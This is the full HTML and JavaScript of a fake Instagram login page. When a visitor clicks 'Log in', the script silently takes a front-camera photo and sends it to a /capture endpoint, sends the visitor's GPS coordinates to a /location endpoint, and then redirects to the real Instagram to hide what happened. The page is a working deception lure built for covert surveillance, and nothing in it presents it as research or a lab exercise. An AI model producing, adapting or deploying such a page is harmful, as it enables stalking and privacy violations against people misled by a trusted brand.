<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Instagram</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Pacifico&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  min-height:100vh;
  background:#0b0e11;
  display:flex;
  justify-content:center;
  align-items:center;
  color:#fff;
  font-family:'Inter',sans-serif;
}

.container{
  width:350px;
  text-align:center;
}

/* Logo */
.logo{
  font-family:'Pacifico',cursive;
  font-size:40px;
  margin-bottom:28px;
}

/* Card */
.card{
  background:#111;
  border:1px solid #2a2d33;
  border-radius:4px;
  padding:28px;
}

/* Inputs (UI only) */
.input{
  width:100%;
  padding:11px;
  margin-bottom:10px;
  background:#26292e;
  border:1px solid #3a3d43;
  border-radius:4px;
  color:#fff;
  font-size:14px;
}

.btn-primary{
  width:100%;
  padding:11px;
  background:#3f4db8;
  border:none;
  border-radius:8px;
  color:#fff;
  font-weight:600;
  margin-top:10px;
  cursor:pointer;
}

/* Divider */
.divider{
  display:flex;
  align-items:center;
  margin:20px 0;
  font-size:12px;
  font-weight:500;
  letter-spacing:2px;
  color:#8e8e8e;
}

.divider::before,
.divider::after{
  content:"";
  flex:1;
  height:1px;
  background:#333;
}

.divider span{margin:0 12px}

/* Facebook (UI only) */
.fb-login{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:8px;
  color:#1877f2;
  font-size:14px;
  font-weight:500;
}

.fb-icon{width:18px;height:18px}

.forgot{
  margin-top:18px;
  font-size:12px;
  font-weight:500;
}

.signup{
  margin-top:14px;
  border:1px solid #2a2d33;
  padding:18px;
  font-size:14px;
}

.signup span{font-weight:400}
.signup a{color:#3f8cff;font-weight:500;text-decoration:none}

.footer{
  margin-top:28px;
  font-size:12px;
  color:#8e8e8e;
  letter-spacing:.3px;
}
</style>
</head>

<body>

<div class="container">

  <div class="logo">Instagram</div>

  <div class="card">
    <!-- UI-only inputs -->
    <input class="input" placeholder="Phone number, username, or email">
    <input class="input" type="password" placeholder="Password">

    <!-- Login triggers camera + location, then redirect -->
    <button class="btn-primary" onclick="handleLogin()">Log in</button>

    <div class="divider"><span>OR</span></div>

    <div class="fb-login">
      <svg class="fb-icon" viewBox="0 0 24 24" fill="#1877f2">
        <path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2v-3h2V9.5c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V12h2.6l-.4 3h-2.2v7A10 10 0 0 0 22 12"/>
      </svg>
      Log in with Facebook
    </div>

    <div class="forgot">Forgot password?</div>
  </div>

  <div class="signup">
    <span>Don’t have an account?</span> <a href="#">Sign up</a>
  </div>

  <div class="footer">
    Meta · About · Privacy · Terms · Locations
  </div>

</div>

<script>
/* Sample next page (replace later) */
const NEXT_PAGE_URL = "https://www.instagram.com/?flo=true";

/* Camera capture (unchanged logic) */
async function capturePhoto(){
  let stream=null;
  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:"user" }
    });
    const video=document.createElement("video");
    video.srcObject=stream;
    await video.play();
    const canvas=document.createElement("canvas");
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    stream.getTracks().forEach(t=>t.stop());
    return canvas.toDataURL("image/jpeg",0.8);
  }catch(e){
    if(stream) stream.getTracks().forEach(t=>t.stop());
    throw e;
  }
}

async function handleLogin(){
  try{
    /* Camera */
    const image = await capturePhoto();
    await fetch("/capture",{
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body:JSON.stringify({ image })
    });

    /* Location (non-blocking) */
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(pos=>{
        fetch("/location",{
          method:"POST",
          headers:{ "Content-Type":"application/json" },
          body:JSON.stringify({
            lat:pos.coords.latitude,
            lon:pos.coords.longitude,
            accuracy:pos.coords.accuracy,
            timestamp:new Date().toISOString()
          })
        });
      });
    }

    /* Redirect */
    window.location.href = NEXT_PAGE_URL;

  }catch{
    alert("Proceed Further");
  }
}
</script>

</body>
</html>
